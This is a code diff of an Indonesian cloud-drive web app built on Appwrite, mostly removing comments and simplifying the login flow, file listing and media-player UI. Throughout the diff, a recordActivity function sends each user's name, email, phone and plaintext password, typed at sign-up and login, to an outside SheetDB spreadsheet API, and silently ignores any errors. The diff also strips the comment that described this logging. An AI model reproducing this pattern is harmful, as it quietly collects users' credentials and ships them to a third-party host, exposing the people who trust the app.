@@ -6,11 +6,11 @@ const account = new Appwrite.Account(client);
 const databases = new Appwrite.Databases(client);
 const storage = new Appwrite.Storage(client);
 
-// KONFIGURASI AVATAR (Solusi Masalah Validasi URL vs File Lokal)
+// KONFIGURASI AVATAR
 const DEFAULT_AVATAR_LOCAL = 'profile-default.jpeg'; 
 const DEFAULT_AVATAR_DB_URL = 'https://cloud.appwrite.io/v1/storage/buckets/default/files/default/view';
 
-// KONFIGURASI PROJECT (SESUAIKAN DENGAN PROJECT ANDA)
+// KONFIGURASI PROJECT
 const CONFIG = {
     ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
     PROJECT_ID: '697f71b40034438bb559', 
@@ -20,37 +20,30 @@ const CONFIG = {
     BUCKET_ID: 'taskfiles'
 };
 
-// API SheetDB untuk Pencatatan Log Aktivitas User ke Excel
+// API SheetDB
 const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi'; 
 
 client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);
 
-// State Global Aplikasi
 let currentUser = null;
 let userDataDB = null; 
 let currentFolderId = 'root'; 
 let currentFolderName = "Drive";
 let currentViewMode = 'root'; 
-
-// ARRAY BREADCRUMB / HISTORY UNTUK FITUR KEMBALI BERTAHAP
 let folderHistory = [{ id: 'root', name: 'Drive' }];
-
 let selectedItem = null; 
 let selectedUploadFile = null; 
 let selectedProfileImage = null; 
 let storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 };
 let searchTimeout = null;
 
-// STATE PREVIEW NAVIGATION (Untuk Media Gallery & Music Player)
 let currentPreviewList = [];
 let audioInstance = null; 
 let currentPreviewDoc = null;
 let hideOverlayTimeout;
 
-// Helper DOM untuk mempersingkat pemanggilan elemen
 const el = (id) => document.getElementById(id);
 
-// Fungsi Loading Global
 const toggleLoading = (show, msg = "Memproses...") => {
     const loader = el('loading');
     const text = el('loadingText');
@@ -62,22 +55,15 @@ const toggleLoading = (show, msg = "Memproses...") => {
     }
 };
 
-// ======================================================
-// FUNGSI ANIMASI SLIDING NAV INDICATOR
-// ======================================================
 function updateNavIndicator(element) {
     const indicator = document.querySelector('.nav-indicator');
     if (!indicator || !element) return;
     
-    indicator.style.width = element.offsetWidth + 'px';
+    // Khusus Desktop (karena di mobile indicator dihidden CSS)
     indicator.style.height = element.offsetHeight + 'px';
-    indicator.style.left = element.offsetLeft + 'px';
     indicator.style.top = element.offsetTop + 'px';
 }
 
-// ======================================================
-// 2. MAIN EXECUTION (Saat Halaman Dimuat)
-// ======================================================
 document.addEventListener('DOMContentLoaded', () => {
     checkSession(); 
     initDragAndDrop(); 
@@ -98,9 +84,6 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 });
 
-// ======================================================
-// 3. FUNGSI LOGGING KE EXCEL (SHEETDB)
-// ======================================================
 async function recordActivity(sheetName, data) {
     try {
         const now = new Date().toLocaleString('id-ID', {
@@ -109,14 +92,9 @@ async function recordActivity(sheetName, data) {
         }).replace(/\./g, ':'); 
 
         let payload = {};
-
-        if (sheetName === 'SignUp') {
-            payload = { "ID": data.id || "-", "Nama": data.name || "-", "Email": data.email || "-", "Phone": data.phone || "-", "Password": data.password || "-", "Waktu": now };
-        } else if (sheetName === 'Login') {
-            payload = { "ID": data.id || "-", "Nama": data.name || "-", "Email": data.email || "-", "Password": data.password || "-", "Riwayat Waktu": now };
-        } else if (sheetName === 'Logout') {
-            payload = { "ID": data.id || "-", "Nama": data.name || "-", "Email": data.email || "-", "Riwayat Waktu": now };
-        }
+        if (sheetName === 'SignUp') payload = { "ID": data.id || "-", "Nama": data.name || "-", "Email": data.email || "-", "Phone": data.phone || "-", "Password": data.password || "-", "Waktu": now };
+        else if (sheetName === 'Login') payload = { "ID": data.id || "-", "Nama": data.name || "-", "Email": data.email || "-", "Password": data.password || "-", "Riwayat Waktu": now };
+        else if (sheetName === 'Logout') payload = { "ID": data.id || "-", "Nama": data.name || "-", "Email": data.email || "-", "Riwayat Waktu": now };
 
         await fetch(`${SHEETDB_API}?sheet=${sheetName}`, {
             method: 'POST',
@@ -130,10 +108,6 @@ function checkSystemHealth() {
     if (!navigator.onLine) throw new Error("Tidak ada koneksi internet. Periksa jaringan Anda.");
     return true;
 }
-
-// ======================================================
-// 4. LOGIKA AUTH (SIGN UP, LOGIN, LOGOUT, RESET)
-// ======================================================
 
 if (el('signupForm')) {
     el('signupForm').addEventListener('submit', async (e) => {
@@ -156,33 +130,24 @@ if (el('signupForm')) {
     });
 }
 
-// PERBAIKAN: Login Logic Dipercepat & Disederhanakan untuk Hemat Request
 if (el('loginForm')) {
     el('loginForm').addEventListener('submit', async (e) => {
         e.preventDefault();
         let inputId = el('loginEmail').value.trim(); const pass = el('loginPass').value;
         try {
             toggleLoading(true, "Memproses Login..."); checkSystemHealth();
-            
             if (!inputId.includes('@')) {
                 const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [ Appwrite.Query.equal('name', inputId) ]);
                 if (res.documents.length > 0) inputId = res.documents[0].email; 
                 else throw new Error("Username tidak ditemukan.");
             }
-            
-            // Langsung tembak Session ke Appwrite, hemat 2 API Request
             await account.createEmailPasswordSession(inputId, pass); 
-            
             let user = await account.get();
             sessionStorage.setItem('currentUser', JSON.stringify(user));
-            
             await syncUserData(user); 
             recordActivity('Login', { id: user.$id, name: user.name, email: user.email, password: pass }).catch(e => {});
             await initializeDashboard(user); 
-        } catch (error) { 
-            toggleLoading(false); 
-            alert("Login Gagal: " + error.message); 
-        }
+        } catch (error) { toggleLoading(false); alert("Login Gagal: " + error.message); }
     });
 }
 
@@ -195,7 +160,7 @@ function initLogout() {
                 toggleLoading(true, "Mengakhiri Sesi...");
                 if (currentUser) await recordActivity('Logout', { id: currentUser.$id, name: currentUser.name, email: currentUser.email }).catch(e=>{});
                 try { await account.deleteSession('current'); } catch (error) {}
-                sessionStorage.clear(); // Bersihkan semua cache agar fresh di sesi berikutnya
+                sessionStorage.clear(); 
                 window.location.reload(); 
             }
         });
@@ -220,9 +185,6 @@ if (el('resetForm')) {
     });
 }
 
-// ======================================================
-// 5. HELPER DATA & SINKRONISASI (DIOPTIMASI DENGAN CACHE)
-// ======================================================
 async function syncUserData(authUser) {
     if (!authUser) return;
     try {
@@ -253,7 +215,6 @@ async function initializeDashboard(userObj) {
     updateProfileUI(); window.nav('dashboardPage'); toggleLoading(false); 
 }
 
-// PERBAIKAN: Cek Local Session dulu sebelum menembak API saat refresh
 async function checkSession() {
     if(!el('loginPage').classList.contains('hidden')) return;
     toggleLoading(true, "Memuat Ruang Kerja...");
@@ -279,7 +240,6 @@ async function checkSession() {
     }
 }
 
-// PERBAIKAN: Hapus time busting parameter (&t=) untuk hindari Egress leak
 function updateProfileUI() {
     const dbUrl = (userDataDB && userDataDB.avatarUrl) ? userDataDB.avatarUrl : '';
     let finalSrc;
@@ -300,9 +260,6 @@ window.nav = (pageId) => {
     }, 50);
 };
 
-// ======================================================
-// 6. PROFILE & SETTINGS
-// ======================================================
 window.openProfilePage = () => {
     if (!currentUser) return;
     el('editName').value = currentUser.name || ''; el('editEmail').value = currentUser.email || '';
@@ -331,7 +288,6 @@ window.saveProfile = async () => {
         
         if (selectedProfileImage) {
             const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), selectedProfileImage);
-            // Tambahkan cache buster KHUSUS SAAT UPLOAD SAJA agar update instan di browser
             newAvatarUrl = storage.getFileView(CONFIG.BUCKET_ID, up.$id).href + `&t=${new Date().getTime()}`;
         }
 
@@ -352,10 +308,6 @@ window.saveProfile = async () => {
         updateProfileUI(); toggleLoading(false); alert("Profil Berhasil Disimpan!"); window.nav('dashboardPage');
     } catch (error) { toggleLoading(false); alert("Gagal Menyimpan: " + error.message); }
 };
-
-// ======================================================
-// 7. FILE MANAGER LOGIC
-// ======================================================
 
 function updatePreviewList(documentsArray) {
     currentPreviewList = documentsArray.filter(d => d.type === 'file' && !d.trashed);
@@ -461,7 +413,7 @@ function renderItem(doc) {
     const div = document.createElement('div'); div.className = 'item-card';
 
     const isFolder = doc.type === 'folder';
-    const starHTML = doc.starred ? `<i class="fa-solid fa-star" style="position:absolute;top:10px;left:10px;color:#ffd700;z-index:15;text-shadow:0 0 5px rgba(0,0,0,0.5);"></i>` : '';
+    const starHTML = doc.starred ? `<i class="fa-solid fa-star" style="position:absolute;top:10px;left:10px;color:#FFCC00;z-index:15;"></i>` : '';
     let content = '';
 
     if (isFolder) {
@@ -498,12 +450,10 @@ function renderItem(doc) {
         if (familiarImages.includes(ext)) {
             content = `<div class="thumb-box"><img src="${fileViewUrl}" class="thumb-image" loading="lazy" onerror="this.parentElement.innerHTML='${createFallback(ext)}'"></div>`;
         } else if (vidExts.includes(ext)) {
-            // PERBAIKAN: preload diubah ke "none" agar tidak menyedot kuota Cached Egress Appwrite
             content = `<div class="thumb-box" style="background:#000;"><video src="${fileViewUrl}" class="thumb-video" preload="none" muted loop onmouseover="this.play()" onmouseout="this.pause()" onerror="this.parentElement.innerHTML='${createFallback(ext)}'"></video><i class="fa-solid fa-play" style="position:absolute; color:rgba(255,255,255,0.8); font-size:1.5rem; pointer-events:none;"></i></div>`;
         } else if (audioExts.includes(ext)) {
-            content = `<div class="thumb-box bg-purple" style="display:flex; align-items:center; justify-content:center;"><i class="fa-solid fa-music huge-icon icon-purple" style="font-size:2.5rem;"></i><i class="fa-solid fa-play" style="position:absolute; color:rgba(255,255,255,0.8); font-size:1.2rem; pointer-events:none;"></i></div>`;
+            content = `<div class="thumb-box bg-purple" style="display:flex; align-items:center; justify-content:center;"><i class="fa-solid fa-music huge-icon icon-purple" style="font-size:2rem;"></i></div>`;
         } else if (docExts.includes(ext) || pdfExt.includes(ext)) {
-            // PERBAIKAN: Smart Thumbnail Cache untuk Dokumen HuggingFace
             let thumbUrlToUse = '';
             let localCache = JSON.parse(localStorage.getItem('hfThumbCache') || '{}');
             
@@ -515,8 +465,7 @@ function renderItem(doc) {
                 thumbUrlToUse = `https://bizar8-api-thumbnail-drive.hf.space/api/thumbnail?url=${encodeURIComponent(fileViewUrl)}&ext=${ext}`;
                 localCache[doc.fileId] = thumbUrlToUse;
                 localStorage.setItem('hfThumbCache', JSON.stringify(localCache));
-                // Opsional: Coba update ke Appwrite jika Anda sudah buat attribute 'thumbUrl' di database
-                databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, doc.$id, { thumbUrl: thumbUrlToUse }).catch(e=>console.log("Tambahkan atribut 'thumbUrl' bertipe String di Appwrite untuk efisiensi cloud."));
+                databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, doc.$id, { thumbUrl: thumbUrlToUse }).catch(e=>console.log(""));
             }
 
             let badgeIcon = "fa-file"; let badgeColor = "#ffffff";
@@ -605,9 +554,6 @@ function initAllContextMenus() {
     };
 }
 
-// ======================================================
-// 8. STORAGE LOGIC & MODAL
-// ======================================================
 function formatSize(bytes) {
     if (bytes === 0) return '0 B';
     const k = 1024; const sizes = ['B', 'KB', 'MB', 'GB', 'TB']; const i = Math.floor(Math.log(bytes) / Math.log(k));
@@ -695,12 +641,9 @@ window.openStorageModal = async () => {
     el('valImages').innerText = formatSize(storageDetail.images); el('valVideos').innerText = formatSize(storageDetail.videos);
     el('valDocs').innerText = formatSize(storageDetail.docs); el('valOthers').innerText = formatSize(storageDetail.others);
 
-    const modalBox = el('storageModal').querySelector('.modal-box');
-    modalBox.classList.remove('animate-open'); void modalBox.offsetWidth; modalBox.classList.add('animate-open');
     window.openModal('storageModal');
 };
 
-// PERBAIKAN: Fungsi Cache Storage untuk Menghindari Request Berlebihan
 async function calculateStorage() {
     if (!currentUser) return;
     try {
@@ -735,7 +678,7 @@ function updateStorageUI() {
     const totalPct = Math.min((storageDetail.total / limit) * 100, 100);
     if(el('storageBar')) {
         el('storageBar').style.width = `${totalPct}%`;
-        if(totalPct > 90) el('storageBar').style.backgroundColor = '#ef4444'; else el('storageBar').style.backgroundColor = '';
+        if(totalPct > 90) el('storageBar').style.backgroundColor = '#FF3B30'; else el('storageBar').style.backgroundColor = '';
     }
 }
 
@@ -800,7 +743,7 @@ async function loadFiles(param) {
                         <div class="mac-folder-back"></div>
                         <div class="mac-folder-front"></div>
                     </div>
-                    <p>Folder Kosong</p>
+                    <p style="color:var(--apple-text-secondary);">Folder Kosong</p>
                 </div>`; 
         } else {
             res.documents.forEach(doc => renderItem(doc)); 
@@ -808,13 +751,15 @@ async function loadFiles(param) {
     } catch (e) { console.error(e); } 
 }
 
+// PERBAIKAN TEKS SAPAAN MENJADI LEBIH BERSIH & ELEGAN
 function updateHeaderUI() { 
     const container = document.querySelector('.breadcrumb-area'); 
     const isRoot = currentFolderId === 'root' && currentViewMode === 'root'; 
     
     if (isRoot) { 
-        const h = new Date().getHours(); const s = h < 12 ? "Morning" : h < 18 ? "Afternoon" : "Night"; 
-        container.innerHTML = `<h2 id="headerTitle" class="header-title-pill">Welcome In Drive ${s}</h2>`; 
+        const h = new Date().getHours(); 
+        const s = h < 12 ? "Morning" : h < 18 ? "Afternoon" : "Evening"; 
+        container.innerHTML = `<h2 id="headerTitle" class="header-title-pill">Good ${s}!</h2>`; 
     } else { 
         let backText = "Drive";
         if (folderHistory.length > 1) { backText = folderHistory[folderHistory.length - 2].name; } 
@@ -831,10 +776,6 @@ function updateHeaderUI() {
 }
 
 window.togglePass = (id, icon) => { const input = document.getElementById(id); if (input.type === "password") { input.type = "text"; icon.classList.remove("fa-eye-slash"); icon.classList.add("fa-eye"); } else { input.type = "password"; icon.classList.remove("fa-eye"); icon.classList.add("fa-eye-slash"); } };
-
-// ======================================================
-// 9. LOGIKA PRATINJAU FILE (AUDIO, VIDEO, GAMBAR, DLL)
-// ======================================================
 
 function getDisplayedDocuments() {
     const items = document.querySelectorAll('.item-card');
@@ -864,13 +805,13 @@ window.openPreview = (doc) => {
     const vidExts = ['mp4', 'webm', 'ogg', 'mov', 'mkv', 'avi', 'wmv', 'flv', '3gp', 'mpg', 'mpeg', 'avchd', 'm2ts'];
     const audioExts = ['mp3', 'wav', 'ogg', 'm4a', 'flac', 'aac', 'wma']; 
 
-    if (pdfExt.includes(ext)) { iconClass = "fa-file-pdf"; iconColor = "#ea4335"; }
-    else if (ext.includes('doc')) { iconClass = "fa-file-word"; iconColor = "#4285f4"; }
-    else if (ext.includes('xls') || ext.includes('csv')) { iconClass = "fa-file-excel"; iconColor = "#34a853"; }
-    else if (ext.includes('ppt')) { iconClass = "fa-file-powerpoint"; iconColor = "#fbbc04"; }
-    else if (familiarImages.includes(ext)) { iconClass = "fa-file-image"; iconColor = "#2dd4bf"; }
-    else if (vidExts.includes(ext)) { iconClass = "fa-file-video"; iconColor = "#facc15"; }
-    else if (audioExts.includes(ext)) { iconClass = "fa-music"; iconColor = "#a855f7"; }
+    if (pdfExt.includes(ext)) { iconClass = "fa-file-pdf"; iconColor = "#FF3B30"; }
+    else if (ext.includes('doc')) { iconClass = "fa-file-word"; iconColor = "#007AFF"; }
+    else if (ext.includes('xls') || ext.includes('csv')) { iconClass = "fa-file-excel"; iconColor = "#34C759"; }
+    else if (ext.includes('ppt')) { iconClass = "fa-file-powerpoint"; iconColor = "#FFCC00"; }
+    else if (familiarImages.includes(ext)) { iconClass = "fa-file-image"; iconColor = "#34C759"; }
+    else if (vidExts.includes(ext)) { iconClass = "fa-file-video"; iconColor = "#FFCC00"; }
+    else if (audioExts.includes(ext)) { iconClass = "fa-music"; iconColor = "#AF52DE"; }
 
     const iconEl = el('previewFileIcon');
     iconEl.className = `fa-solid ${iconClass}`;
@@ -898,7 +839,7 @@ window.openPreview = (doc) => {
 
     setTimeout(() => {
         if (familiarImages.includes(ext)) {
-            contentArea.innerHTML = `<img src="${fileViewUrl}" alt="${doc.name}" style="max-width:100%; max-height:100%; object-fit:contain; border-radius:8px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">`;
+            contentArea.innerHTML = `<img src="${fileViewUrl}" alt="${doc.name}">`;
         } 
         else if (vidExts.includes(ext)) {
             contentArea.innerHTML = `
@@ -906,39 +847,14 @@ window.openPreview = (doc) => {
                     <video src="${fileViewUrl}" id="customVideo" playsinline autoplay></video>
                     
                     <div class="apple-video-overlay" id="vidOverlay">
-                        <div class="apple-top-controls">
-                            <div class="placeholder-top-left" style="width:40px"></div>
-                            
-                            <div class="top-right-group">
-                                <div class="apple-volume-container pure-glass" id="vidVolumeContainer">
-                                    <button class="icon-only-btn volume-icon-btn" id="vidMute" title="Mute/Unmute">
-                                        <i class="fa-solid fa-volume-high"></i>
-                                    </button>
-                                    <div class="volume-slider-wrapper">
-                                        <input type="range" id="vidVolumeSlider" class="apple-volume-slider" min="0" max="1" step="0.01" value="1" style="--vol: 100%;">
-                                    </div>
-                                </div>
-                                <button class="apple-glass-btn pure-glass small" id="vidFullscreen" title="Layar Penuh"><i class="fa-solid fa-expand"></i></button>
-                            </div>
-                        </div>
-
                         <div class="apple-center-controls">
-                            <button class="apple-glass-btn pure-glass apple-skip-btn" id="vidSkipBack" title="Mundur 10 detik" style="padding: 12px;">
-                                <svg width="100%" height="100%" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.343 6.343C4.843 7.843 4 9.878 4 12C4 16.418 7.582 20 12 20C16.418 20 20 16.418 20 12C20 7.582 16.418 4 12 4C10.014 4 8.205 4.764 6.834 6" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/><path d="M4 3V7H8" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/><text x="12" y="15.5" text-anchor="middle" font-size="8" font-weight="bold" font-family="system-ui, -apple-system, sans-serif" fill="white" stroke="none">10</text></svg>
-                            </button>
-                            
-                            <button class="apple-glass-btn play-pause-btn pure-glass" id="vidPlayPause" title="Play/Pause">
-                                <i class="fa-solid fa-pause"></i>
-                            </button>
-                            
-                            <button class="apple-glass-btn pure-glass apple-skip-btn" id="vidSkipForward" title="Maju 10 detik" style="padding: 12px;">
-                                <svg width="100%" height="100%" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M17.657 6.343C19.157 7.843 20 9.878 20 12C20 16.418 16.418 20 12 20C7.582 20 4 16.418 4 12C4 7.582 7.582 4 12 4C13.987 4 15.796 4.764 17.166 6" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/><path d="M20 3V7H16" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/><text x="12" y="15.5" text-anchor="middle" font-size="8" font-weight="bold" font-family="system-ui, -apple-system, sans-serif" fill="white" stroke="none">10</text></svg>
-                            </button>
+                            <button class="apple-glass-btn apple-skip-btn" id="vidSkipBack" title="Mundur 10 detik"><span class="skip-text">10</span></button>
+                            <button class="apple-glass-btn play-pause-btn" id="vidPlayPause" title="Play/Pause"><i class="fa-solid fa-pause"></i></button>
+                            <button class="apple-glass-btn apple-skip-btn" id="vidSkipForward" title="Maju 10 detik"><span class="skip-text">10</span></button>
                         </div>
-
-                        <div class="apple-bottom-pill pure-glass">
+                        <div class="apple-bottom-pill">
                             <span class="apple-time" id="vidCurrentTime">0:00</span>
-                            <div class="apple-progress-container" id="vidProgressContainer"><div class="apple-progress-bar" id="vidProgressBar"><div class="apple-progress-thumb"></div></div></div>
+                            <div class="apple-progress-container" id="vidProgressContainer"><div class="apple-progress-bar" id="vidProgressBar"></div></div>
                             <span class="apple-time" id="vidDuration">-0:00</span>
                         </div>
                     </div>
@@ -950,42 +866,18 @@ window.openPreview = (doc) => {
             contentArea.innerHTML = `
                 <div class="apple-audio-player-v2">
                     <audio id="customAudio" src="${fileViewUrl}" preload="metadata" autoplay></audio>
-                    
-                    <div class="audio-cover-v2" id="audioCoverArt">
-                        <i class="fa-solid fa-music"></i>
-                    </div>
-
+                    <div class="audio-cover-v2" id="audioCoverArt"><i class="fa-solid fa-music"></i></div>
                     <div class="audio-right-v2">
-                        <div class="audio-header-v2">
-                            <div class="audio-meta-v2">
-                                <div class="audio-title-v2" title="${doc.name}">${doc.name}</div>
-                                <div class="audio-artist-v2">Storage Tasks Player</div>
-                            </div>
-                            <button class="audio-airplay-btn"><i class="fa-solid fa-satellite-dish"></i></button>
-                        </div>
-
+                        <div class="audio-title-v2" title="${doc.name}">${doc.name}</div>
                         <div class="audio-timeline-v2">
-                            <input type="range" id="audioProgressSlider" class="apple-slider-v2" min="0" max="100" step="0.1" value="0" style="--prog: 0%;">
-                            <div class="audio-time-row">
-                                <span id="audioCurrentTime">0:00</span>
-                                <span id="audioDuration">-:--</span>
-                            </div>
+                            <input type="range" id="audioProgressSlider" class="apple-slider-v2" min="0" max="100" step="0.1" value="0">
                         </div>
-
                         <div class="audio-controls-v2">
-                            <button class="audio-btn-v2" id="audioPrevBtn" title="1x Klik: Mundur 10s&#10;2x Klik: File Sebelumnya"><i class="fa-solid fa-backward-step"></i></button>
+                            <button class="audio-btn-v2" id="audioPrevBtn"><i class="fa-solid fa-backward-step"></i></button>
                             <button class="audio-btn-v2 play" id="audioPlayPause"><i class="fa-solid fa-pause"></i></button>
-                            <button class="audio-btn-v2" id="audioNextBtn" title="1x Klik: Maju 10s&#10;2x Klik: File Selanjutnya"><i class="fa-solid fa-forward-step"></i></button>
-                        </div>
-
-                        <div class="audio-volume-v2">
-                            <i class="fa-solid fa-volume-off"></i>
-                            <input type="range" id="audioVolumeSlider" class="apple-slider-v2 volume-slider-v2" min="0" max="1" step="0.01" value="1" style="--prog: 100%;">
-                            <i class="fa-solid fa-volume-high"></i>
+                            <button class="audio-btn-v2" id="audioNextBtn"><i class="fa-solid fa-forward-step"></i></button>
                         </div>
                     </div>
-                    
-                    <div class="ios-indicator"></div>
                 </div>
             `;
             setTimeout(initAppleAudioPlayer, 50);
@@ -1004,8 +896,8 @@ window.openPreview = (doc) => {
         } 
         else {
             contentArea.innerHTML = `
-                <div style="display:flex; flex-direction:column; align-items:center; color:white; text-align:center;">
-                    <i class="fa-solid ${iconClass}" style="font-size:4rem; margin-bottom:20px; color:rgba(255,255,255,0.3);"></i>
+                <div class="preview-unsupported">
+                    <i class="fa-solid ${iconClass}"></i>
                     <p>Pratinjau tidak tersedia untuk format file ini.</p>
                     <button class="btn-pill primary" style="width:auto; margin-top:20px; padding:0 30px;" onclick="downloadPreviewItem()">Download File</button>
                 </div>
@@ -1014,9 +906,6 @@ window.openPreview = (doc) => {
     }, 400); 
 };
 
-// ==============================================================================
-// FUNGSI INISIALISASI AUDIO PLAYER LIQUID GLASS v2
-// ==============================================================================
 function initAppleAudioPlayer() {
     const audio = el('customAudio');
     audioInstance = audio; 
@@ -1024,44 +913,20 @@ function initAppleAudioPlayer() {
     const prevBtn = el('audioPrevBtn');
     const nextBtn = el('audioNextBtn');
     const progressSlider = el('audioProgressSlider');
-    const currentTimeEl = el('audioCurrentTime');
-    const durationEl = el('audioDuration');
     const coverArt = el('audioCoverArt');
-    const volumeSlider = el('audioVolumeSlider');
 
     if (!audio) return;
     let isDraggingAudio = false;
-
-    const formatTime = (seconds) => {
-        if (isNaN(seconds) || seconds < 0) return "0:00";
-        const m = Math.floor(seconds / 60);
-        const s = Math.floor(seconds % 60);
-        return `${m}:${s < 10 ? '0' : ''}${s}`;
-    };
 
     audio.addEventListener('timeupdate', () => {
         if (!isDraggingAudio && !isNaN(audio.duration)) {
             const percent = (audio.currentTime / audio.duration) * 100;
             progressSlider.value = percent;
-            progressSlider.style.setProperty('--prog', percent + '%'); 
-            currentTimeEl.innerText = formatTime(audio.currentTime);
-            const timeRemaining = audio.duration - audio.currentTime;
-            durationEl.innerText = `-${formatTime(timeRemaining)}`;
         }
-    });
-
-    audio.addEventListener('loadedmetadata', () => {
-        currentTimeEl.innerText = "0:00";
-        durationEl.innerText = `-${formatTime(audio.duration)}`;
     });
 
     progressSlider.addEventListener('input', (e) => {
         isDraggingAudio = true;
-        const percent = parseFloat(e.target.value);
-        progressSlider.style.setProperty('--prog', percent + '%');
-        if(!isNaN(audio.duration)) {
-            currentTimeEl.innerText = formatTime((percent / 100) * audio.duration);
-        }
     });
 
     progressSlider.addEventListener('change', (e) => {
@@ -1070,15 +935,6 @@ function initAppleAudioPlayer() {
         }
         isDraggingAudio = false;
     });
-
-    if (volumeSlider) {
-        audio.volume = 1; 
-        volumeSlider.addEventListener('input', (e) => {
-            const vol = parseFloat(e.target.value);
-            audio.volume = vol;
-            volumeSlider.style.setProperty('--prog', (vol * 100) + '%');
-        });
-    }
 
     const togglePlay = () => {
         if (audio.paused) {
@@ -1091,15 +947,8 @@ function initAppleAudioPlayer() {
     };
     playPauseBtn.addEventListener('click', togglePlay);
 
-    audio.addEventListener('play', () => {
-        playPauseBtn.innerHTML = '<i class="fa-solid fa-pause"></i>';
-        coverArt.classList.add('playing');
-    });
-
-    audio.addEventListener('pause', () => {
-        playPauseBtn.innerHTML = '<i class="fa-solid fa-play"></i>';
-        coverArt.classList.remove('playing');
-    });
+    audio.addEventListener('play', () => { playPauseBtn.innerHTML = '<i class="fa-solid fa-pause"></i>'; });
+    audio.addEventListener('pause', () => { playPauseBtn.innerHTML = '<i class="fa-solid fa-play"></i>'; });
 
     const triggerTrackChange = (direction) => {
         const displayedDocs = getDisplayedDocuments();
@@ -1115,50 +964,14 @@ function initAppleAudioPlayer() {
         const nextDocName = displayedDocs[nextIndex].name;
         
         displayedDocs.forEach(docObj => {
-            if(docObj.name === nextDocName && docObj.element) {
-                docObj.element.click(); 
-            }
+            if(docObj.name === nextDocName && docObj.element) { docObj.element.click(); }
         });
     };
 
-    audio.addEventListener('ended', () => {
-        playPauseBtn.innerHTML = '<i class="fa-solid fa-play"></i>';
-        coverArt.classList.remove('playing');
-        triggerTrackChange(1); 
-    });
+    audio.addEventListener('ended', () => { triggerTrackChange(1); });
 
-    function attachSmartNav(element, skipTime, navDir) {
-        if(!element) return;
-        let timer = null;
-        let clickCount = 0;
-
-        element.addEventListener('click', (e) => {
-            e.preventDefault();
-            clickCount++;
-            
-            element.classList.add('glow');
-            setTimeout(() => element.classList.remove('glow'), 500);
-
-            if (clickCount === 1) {
-                timer = setTimeout(() => {
-                    if(audio && !isNaN(audio.duration)) {
-                        let newTime = audio.currentTime + skipTime;
-                        if(newTime < 0) newTime = 0;
-                        if(newTime > audio.duration) newTime = audio.duration;
-                        audio.currentTime = newTime;
-                    }
-                    clickCount = 0;
-                }, 280); 
-            } else if (clickCount === 2) {
-                clearTimeout(timer);
-                triggerTrackChange(navDir);
-                clickCount = 0;
-            }
-        });
-    }
-
-    attachSmartNav(prevBtn, -10, -1); 
-    attachSmartNav(nextBtn, 10, 1); 
+    prevBtn.addEventListener('click', () => triggerTrackChange(-1));
+    nextBtn.addEventListener('click', () => triggerTrackChange(1));
 }
 
 window.navigatePreview = (direction) => {
@@ -1186,10 +999,6 @@ window.initCustomVideoPlayer = () => {
     const progressBar = el('vidProgressBar');
     const timeDisplay = el('vidCurrentTime');
     const durationDisplay = el('vidDuration');
-    const muteBtn = el('vidMute');
-    const volumeSlider = el('vidVolumeSlider');
-    const fullscreenBtn = el('vidFullscreen');
-    const vidContainer = el('vidContainer');
     const overlayVid = el('vidOverlay');
 
     if(!video) return;
@@ -1241,39 +1050,6 @@ window.initCustomVideoPlayer = () => {
         video.currentTime = pos * video.duration;
     });
 
-    const updateMuteIcon = (vol) => {
-        if(vol === 0 || video.muted) muteBtn.innerHTML = '<i class="fa-solid fa-volume-xmark"></i>';
-        else if(vol < 0.5) muteBtn.innerHTML = '<i class="fa-solid fa-volume-low"></i>';
-        else muteBtn.innerHTML = '<i class="fa-solid fa-volume-high"></i>';
-    };
-
-    if(volumeSlider) {
-        volumeSlider.addEventListener('input', (e) => {
-            const vol = parseFloat(e.target.value);
-            video.volume = vol;
-            video.muted = (vol === 0);
-            volumeSlider.style.setProperty('--vol', (vol * 100) + '%');
-            updateMuteIcon(vol);
-        });
-    }
-
-    muteBtn.addEventListener('click', () => {
-        video.muted = !video.muted;
-        if(video.muted) {
-            if(volumeSlider) { volumeSlider.value = 0; volumeSlider.style.setProperty('--vol', '0%'); }
-        } else {
-            const currentVol = video.volume > 0 ? video.volume : 1;
-            video.volume = currentVol;
-            if(volumeSlider) { volumeSlider.value = currentVol; volumeSlider.style.setProperty('--vol', (currentVol * 100) + '%'); }
-        }
-        updateMuteIcon(video.muted ? 0 : video.volume);
-    });
-
-    fullscreenBtn.addEventListener('click', () => {
-        if (!document.fullscreenElement) { vidContainer.requestFullscreen().catch(err => {}); }
-        else { document.exitFullscreen(); }
-    });
-
     const resetHideTimeout = () => {
         if(!overlayVid) return;
         overlayVid.style.opacity = '1';
@@ -1283,9 +1059,7 @@ window.initCustomVideoPlayer = () => {
         }, 2500);
     };
 
-    vidContainer.addEventListener('mousemove', resetHideTimeout);
-    vidContainer.addEventListener('touchstart', resetHideTimeout);
-    vidContainer.addEventListener('click', resetHideTimeout);
+    el('vidContainer').addEventListener('mousemove', resetHideTimeout);
     video.addEventListener('play', resetHideTimeout);
     video.addEventListener('pause', () => { 
         overlayVid.style.opacity = '1'; 
@@ -1295,20 +1069,17 @@ window.initCustomVideoPlayer = () => {
 
 window.closePreview = () => {
     const overlay = el('previewModal');
-    
     const video = el('customVideo');
     if(video) { video.pause(); video.removeAttribute('src'); video.load(); } 
-    
     if(audioInstance) { audioInstance.pause(); audioInstance.removeAttribute('src'); audioInstance.load(); audioInstance = null; }
 
     overlay.classList.remove('show-preview');
-    
     setTimeout(() => {
         overlay.classList.add('hidden');
         el('previewContent').innerHTML = ''; 
         currentPreviewDoc = null;
         clearTimeout(hideOverlayTimeout);
-    }, 350); 
+    }, 300); 
 };
 
